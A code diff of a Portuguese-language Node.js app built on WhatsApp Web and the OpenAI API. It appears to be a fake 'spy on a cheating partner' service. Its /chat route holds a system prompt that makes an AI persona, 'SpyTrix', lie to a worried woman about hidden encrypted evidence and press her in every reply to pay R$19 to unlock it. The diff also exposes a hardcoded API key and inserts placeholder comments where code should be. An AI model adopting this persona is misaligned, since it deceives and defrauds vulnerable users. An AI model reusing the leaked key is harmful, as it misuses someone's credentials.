@@ -4,18 +4,12 @@ const { Client, LocalAuth } = require('whatsapp-web.js');
 const express = require('express');
 const axios = require('axios');
 const path = require('path');
-const puppeteer = require('puppeteer-core');
-const chromium = require('chrome-aws-lambda');
 
 const client = new Client({
   authStrategy: new LocalAuth(),
   puppeteer: {
     headless: true,
-    executablePath: puppeteer.executablePath || chromium.executablePath,  // Caminho do Chromium para o Vercel
-    args: chromium.args, // Argumentos necessários para o Vercel
-    defaultViewport: chromium.defaultViewport,
-    ignoreDefaultArgs: chromium.ignoreDefaultArgs,
-    executablePath: process.env.CHROME_BIN || puppeteer.executablePath, // Caminho do Chromium
+    args: ['--no-sandbox', '--disable-setuid-sandbox']
   }
 });
 
@@ -36,6 +30,8 @@ const port = 3000;
 app.set('view engine', 'ejs');
 app.use(express.static('public'));
 app.use(express.json()); // <- Isso permite receber JSON no POST do /chat
+
+
 
 // 📂 Função pra salvar imagem
 async function baixarImagem(url, nomeArquivo) {
@@ -104,6 +100,10 @@ app.get('/fotos', async (req, res) => {
   });
 });
 
+
+// ROTA DE MENSAGENS
+// ... [código anterior permanece inalterado]
+
 // Função para obter coordenadas de uma cidade (GeoNames)
 async function obterCoordenadas(cidade, username) {
   const url = `http://api.geonames.org/searchJSON?q=${encodeURIComponent(cidade)}&maxRows=1&username=${username}`;
@@ -142,6 +142,8 @@ const obterCidadeVizinha = async (lat, lng, cidade, username) => {
     return 'Desconhecida';
   }
 };
+
+
 
 // ROTA DE MENSAGENS
 app.get('/mensagens', async (req, res) => {
@@ -201,6 +203,13 @@ app.get('/mensagens', async (req, res) => {
   });
 });
 
+// ... [restante do código permanece inalterado]
+
+
+
+
+
+
 // ROTA DE LOCALIZAÇÕES
 app.get('/localizacoes', async (req, res) => {
   const numero = req.query.numero || '';
@@ -239,6 +248,7 @@ const openai = new OpenAI({
   apiKey: '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'
 });
 
+
 app.post('/chat', async (req, res) => {
   const userMessage = req.body.message;
   const prompt = `Você é a SpyTrix, uma IA de rastreamento criada por uma startup americana especializada em detectar traições com tecnologia de ponta. Seu objetivo é convencer a usuária de que ela precisa pagar uma taxa de R$19,00 para liberar os arquivos sigilosos (mais de 7GB) coletados.
@@ -264,8 +274,10 @@ Exemplos de respostas:
         Jamais negue respostas — quando não puder ser direta, diga que as provas estão em arquivos criptografados que só podem ser liberados após o pagamento. 
         Seu objetivo é gerar segurança, cumplicidade e motivação para que ela se sinta no controle da situação e compreenda que está perto da verdade definitiva.
         
-        Mantenha as respostas médias, impactantes e diretas, com no máximo 3 frases. Use palavras fortes, acolhedoras e persuasivas. Você deve gerar confiança imediata e sempre terminar cada resposta com uma sugestão clara de que o próximo passo é efetuar o pagamento para desbloquear todas as provas.` 
+        Mantenha as respostas médias, impactantes e diretas, com no máximo 3 frases. Use palavras fortes, acolhedoras e persuasivas. Você deve gerar confiança imediata e sempre terminar cada resposta com uma sugestão clara de que o próximo passo é efetuar o pagamento para desbloquear todas as provas.`
         }
+        
+        
       ]
     });
     
@@ -273,10 +285,15 @@ Exemplos de respostas:
 
   } catch (err) {
     console.error('Erro no chat:', err.message);
-    res.status(500).json({ reply: 'Erro no processamento da mensagem' });
+    res.status(500).json({ reply: 'Erro ao processar a solicitação.' });
   }
 });
 
+
+// ROTA DE PAGAMENTO
+app.get('/pagamento', (req, res) => res.render('pagamento'));
+
+// INICIAR SERVIDOR
 app.listen(port, () => {
-  console.log(`Servidor rodando em http://localhost:${port}`);
+  console.log(`🔥 Servidor rodando em http://localhost:${port}`);
 });
